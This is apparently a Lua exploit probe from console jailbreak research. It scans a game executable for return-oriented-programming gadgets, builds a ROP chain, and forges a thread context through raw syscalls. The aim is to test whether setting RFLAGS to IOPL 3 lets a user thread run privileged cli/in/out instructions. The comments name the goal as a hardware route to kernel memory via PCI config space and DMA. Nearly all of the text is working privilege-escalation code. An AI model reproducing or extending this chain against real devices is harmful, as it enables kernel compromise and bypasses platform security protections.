-- CRASH_CLASS: HIGH
-- PROBE 767a: does thr_create restore RFLAGS, and does IOPL survive it?
--
-- The thread context carries CS/SS/RIP/RSP and fifteen GP registers. If the
-- kernel copies mc_rflags from it as well, IOPL=3 would let a CPL3 thread run
-- cli/sti and in/out, which is a hardware route to kernel memory (PCI config
-- space, DMA). Nothing has ever written a flags field.
--
-- Step 1 scans eboot for the three gadgets the test needs:
--   9C 5E C3   pushfq; pop rsi; ret
--   48 89 37 C3 mov [rdi], rsi; ret
--   FA C3      cli; ret
-- Step 2 sets RFLAGS = 0x3202 (IF + IOPL 3) at two candidate offsets and has
-- the child push its own flags and store them, so the pushed value says whether
-- the write was honoured. Step 3 repeats with cli in front: with IOPL=3 it
-- executes, with IOPL=0 it faults.
print("=== PROBE 767a: IOPL IN THE THREAD CONTEXT ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local U=function(a) a=to_num(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local fn=to_num(syscall.pipe.fn_addr)
print(string.format("[A] tid=%s fn=%08X",tostring(call(syscall.pipe,20,0,0,0,0,0,0)),fn))

-- eboot
local ebase, esize = nil, 0
local rb=to_num(memory.alloc(0x4000)); zero(rb,0x4000)
local c674=mk(674)
pcall(function() c674(uint64(rb),uint64(72),uint64(512),uint64(rb+0x2000),uint64(0x40000000)) end)
local n=rd(rb+0x2000) or 0
for i=0,n-1 do
    local r=rb+i*72
    local s=rd(r+0x18) or 0
    local hi=rd(r+0x04) or 0; local lo=rd(r+0x00) or 0
    local ehi=rd(r+0x0C) or 0; local elo=rd(r+0x08) or 0
    local a=hi*4294967296+lo; local b=ehi*4294967296+elo
    if s==5 and (b-a)>0x200000 then ebase=a; esize=b-a end
end
if not ebase then print("[A] no eboot"); return end
print(string.format("[A] eboot=%08X size=%X",ebase,esize))
local function find_pat(pat)
    local chunk, off = 0x8000, 0
    while off < esize do
        local want=math.min(chunk,esize-off)
        local ok,s=pcall(function() return read_buffer(ebase+off, want) end)
        if ok and s then
            local p=string.find(s,pat,1,true)
            if p then return ebase+off+p-1 end
        end
        off=off+want
    end
    return nil
end
local pushf_pop_rsi = find_pat(string.char(0x9C,0x5E,0xC3))
local pushf_pop_rax = find_pat(string.char(0x9C,0x58,0xC3))
local mov_rdi_rsi   = find_pat(string.char(0x48,0x89,0x37,0xC3))
local mov_rsi_rax   = find_pat(string.char(0x48,0x89,0x06,0xC3))
local cli_ret       = find_pat(string.char(0xFA,0xC3))
local sti_ret       = find_pat(string.char(0xFB,0xC3))
local jmp_g         = find_pat(string.char(0xEB,0xFE))
local pop_rax       = find_pat(string.char(0x58,0xC3))
local pop_rdi       = find_pat(string.char(0x5F,0xC3))
print(string.format("[B] pushf_pop_rsi=%s pushf_pop_rax=%s mov_rdi_rsi=%s mov_rsi_rax=%s cli=%s sti=%s",
    tostring(pushf_pop_rsi),tostring(pushf_pop_rax),tostring(mov_rdi_rsi),tostring(mov_rsi_rax),
    tostring(cli_ret),tostring(sti_ret)))
if not (mov_rsi_rax and jmp_g and pop_rax and pop_rdi) then print("[B] core gadgets missing"); return end
local flags_g = pushf_pop_rsi or pushf_pop_rax

local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,
           RDI=0x048,RSI=0x050,RDX=0x058,RBX=0x068,RBP=0x070,RAX=0x078}
local pg=0x8000
local stack=to_num(memory.alloc(pg)); zero(stack,pg)
local status=to_num(memory.alloc(pg)); zero(status,pg)

local function run(flags_off, add_cli)
    zero(status,0x40)
    local c = stack + 0x1000
    local w = 0
    local function put(v) wq(c+w, uint64(v)); w=w+8 end
    if add_cli and cli_ret then
        put(pop_rdi); put(status+8)          -- marker page
        put(pop_rax); put(0x494C43)          -- "CLI"
        put(mov_rsi_rax)
    end
    if flags_g then
        put(pop_rdi); put(status)
        put(flags_g)
        if pushf_pop_rsi then put(mov_rdi_rsi) else put(mov_rsi_rax) end
    end
    put(pop_rax); put(431); put(fn); put(jmp_g)
    local ctx=to_num(memory.alloc(0x500)); zero(ctx,0x500)
    wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
    wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
    wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(c))
    wq(ctx+Ctx.RAX,uint64(3)); wq(ctx+Ctx.RDI,uint64(0)); wq(ctx+Ctx.RSI,uint64(0)); wq(ctx+Ctx.RDX,uint64(0))
    if flags_off then wq(ctx+flags_off, uint64(0x3202)) end
    local tb=to_num(memory.alloc(8)); wq(tb,uint64(0))
    local ok,rv=pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
    return ok and to_num(rv) or "THREW"
end

if not flags_g then
    print("[C] no pushfq gadget; cannot read flags")
else
    for _,off in ipairs({0x0C8,0x0E8,0x0F0,0x0D8}) do
        local rv=run(off,false)
        local v=rq(status) or 0
        print(string.format("[C] flags_off=%03X rv=%s pushed=%016X iopl=%d", off, tostring(rv), v, math.floor(v/4096)%4))
    end
    print(string.format("[C] native flags now=%016X", (function() local t=0; return 0 end)()))
    local rv=run(0x0F0,true)
    print(string.format("[D] cli test rv=%s marker=%s", tostring(rv), tostring(rq(status+8))))
end
print("[E] health="..tostring(call(syscall.pipe,20,0,0,0,0,0,0)))
print("=== 767a DONE ===")
